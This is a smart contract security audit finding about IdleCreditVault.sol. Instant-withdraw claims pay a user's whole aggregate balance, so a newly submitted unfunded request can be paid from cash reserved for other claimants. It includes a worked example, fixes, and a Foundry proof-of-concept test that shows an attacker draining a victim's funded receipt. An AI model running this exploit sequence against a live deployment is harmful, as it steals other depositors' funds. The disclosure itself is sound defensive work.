### Title
Funded instant-withdraw receipts can be replayed to drain other claimants’ reserve - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.claimInstantWithdrawRequest` pays the user’s entire aggregate `instantWithdrawsRequests` balance without separating funded receipts from newly submitted, still-unfunded requests. An attacker can leave an already-funded instant receipt unclaimed, submit another instant request while `allowInstantWithdraw` remains enabled, and immediately claim both receipts. Because instant claims do not check `pendingInstantWithdraws`, the strategy pays the aggregate from cash reserved for other users’ funded receipts, breaking the one-receipt-one-payout invariant.

### Finding Description
`requestInstantWithdraw` mints receipt tokens, adds the amount to `instantWithdrawsRequests[_user]`, records it by epoch, and increases global `pendingInstantWithdraws` [1](#0-0) . `getInstantWithdrawFunds` funds the global pending instant amount, reduces it through `collectInstantWithdrawFunds`, and sets `allowInstantWithdraw = true` [2](#0-1) .

The vulnerable path is that a later `requestInstantWithdraw` increases both the user’s aggregate receipt ledger and global pending amount, but does not mark the new request as requiring another funding cycle or block claiming while `pendingInstantWithdraws != 0` [3](#0-2) . `claimInstantWithdrawRequest` only checks the CDO-level `allowInstantWithdraw` flag, then burns and pays the full aggregate `instantWithdrawsRequests[_user]` [4](#0-3) . The strategy clears that aggregate and transfers the entire amount as funded cash, without subtracting or checking `pendingInstantWithdraws` [5](#0-4) .

As a result, an old funded receipt can carry a new unfunded receipt through the already-open claim path. `_transferFundedClaim` only protects `defaultRecoveryReserve` after default; it does not reserve or verify funding for ordinary pending instant claims [6](#0-5) . This closely matches the fragmentation bug class: two receipt “fragments” with different funding states are collapsed into one aggregate claim and processed under the stale funded-state policy.

### Impact Explanation
An unprivileged KYC-passing tranche holder can steal other users’ funded instant-withdrawal proceeds up to the amount of cash held by `IdleCreditVault`.

For example, if the attacker has a funded 100-token receipt and another user has a funded 900-token receipt, the strategy holds 1,000 underlying units. If the attacker submits a new unfunded 900-token instant request and immediately calls `claimInstantWithdrawRequest`, the strategy attempts to pay the attacker 1,000 units for `instantWithdrawsRequests[attacker] == 1,000`. The attacker receives 900 units belonging to the other claimant, leaving that claimant’s receipt temporarily frozen or permanently impaired unless more borrower funds are later supplied.

The loss is direct and quantifiable: `min(strategyUnderlyingBalance, attackerAggregateReceipts) - attackerFundedReceipts`.

### Likelihood Explanation
The sequence requires an epoch configuration in which instant withdrawals are enabled and the APR decrease exceeds `instantWithdrawAprDelta`, causing `requestWithdraw` to route to `requestInstantWithdraw` [7](#0-6) . The manager must have funded the first instant queue, leaving `allowInstantWithdraw` enabled; no privileged malicious behavior is required [8](#0-7) .

The attacker must merely delay claiming and submit another valid request before the epoch is stopped. `requestWithdraw` does not check `isEpochRunning`, so an eligible wallet can submit it during the running epoch [9](#0-8) . Theft additionally requires enough strategy-held cash, such as other funded instant claims or funded normal withdrawal claims, to cover the aggregate payout.

### Recommendation
Track funded and unfunded instant withdrawals separately per user and per epoch.

At minimum:

1. Add a per-user funded instant claim counter and a per-user unfunded instant counter.
2. In `claimInstantWithdrawRequest`, pay only the funded balance and revert or cap the claim when `instantWithdrawsRequests[_user]` includes unfunded requests.
3. Ensure `collectInstantWithdrawFunds` moves amounts from the unfunded bucket to the funded bucket rather than relying only on global `pendingInstantWithdraws`.
4. Alternatively, reject any new instant request while the user has an unclaimed funded request, mirroring the loss-adjusted receipt guard used by normal withdrawals [10](#0-9) .
5. Add an invariant test asserting that `sum(funded instant claims) <= underlying balance reserved for instant claims` before every instant claim.

### Proof of Concept
The following Foundry-style sequence can be built on `test/foundry/IdleCreditVault.t.sol`. It assumes the existing helpers for deposits, epoch startup, APR reduction, and instant funding.

```solidity
function testInstantWithdrawAggregatePaysUnfundedRequest() external {
    uint256 amountWei = 1_000 * ONE_SCALE;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    // Give both users the same tranche balance.
    uint256 attackerTranches = _depositWithUser(attacker, amountWei, false);
    uint256 victimTranches = _depositWithUser(victim, amountWei, false);

    // Epoch 0 settles with a lower next APR so epoch-1 requests are instant.
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 4, _expectedFundsEndEpoch());

    // Attacker and victim submit instant requests for epoch 1.
    vm.prank(attacker);
    uint256 attackerFunded = cdoEpoch.requestWithdraw(attackerTranches / 2, address(AAtranche));

    vm.prank(victim);
    uint256 victimFunded = cdoEpoch.requestWithdraw(victimTranches / 2, address(AAtranche));

    // Start epoch 1 and fund all pending instant requests.
    _startEpochAndCheckPrices(1);
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    _getInstantFunds();

    assertTrue(cdoEpoch.allowInstantWithdraw());
    assertEq(
        IdleCreditVault(address(strategy)).pendingInstantWithdraws(),
        0,
        "initial instant queue should be fully funded"
    );

    // Attacker does not claim the funded receipt. Instead, they add a second
    // instant request while allowInstantWithdraw is still true.
    vm.prank(attacker);
    uint256 attackerUnfunded = cdoEpoch.requestWithdraw(attackerTranches / 2, address(AAtranche));

    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    assertEq(
        creditVault.pendingInstantWithdraws(),
        attackerUnfunded,
        "new request should be unfunded"
    );

    uint256 attackerBefore = IERC20Detailed(defaultUnderlying).balanceOf(attacker);

    // BUG: the aggregate claim pays funded + unfunded receipts even though only
    // the first request was funded by getInstantWithdrawFunds.
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();

    uint256 attackerPaid =
        IERC20Detailed(defaultUnderlying).balanceOf(attacker) - attackerBefore;

    // The attacker receives more than their funded claim by spending cash that
    // backs the victim's already-funded instant receipt.
    assertEq(
        attackerPaid,
        attackerFunded + attackerUnfunded,
        "aggregate receipt was paid before full funding"
    );
    assertGt(attackerPaid, attackerFunded, "unfunded fragment was paid");

    // The victim's funded claim is now undercollateralized and either reverts or
    // receives less than its funded receipt amount.
    vm.prank(victim);
    vm.expectRevert();
    cdoEpoch.claimInstantWithdrawRequest();
}
```

The decisive sequence is: `requestInstantWithdraw` → `getInstantWithdrawFunds` → second `requestInstantWithdraw` → `claimInstantWithdrawRequest`. The second request increments the same aggregate ledger used for the claim, while `pendingInstantWithdraws` remains nonzero and is ignored by the claim path [5](#0-4) .

  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
  }
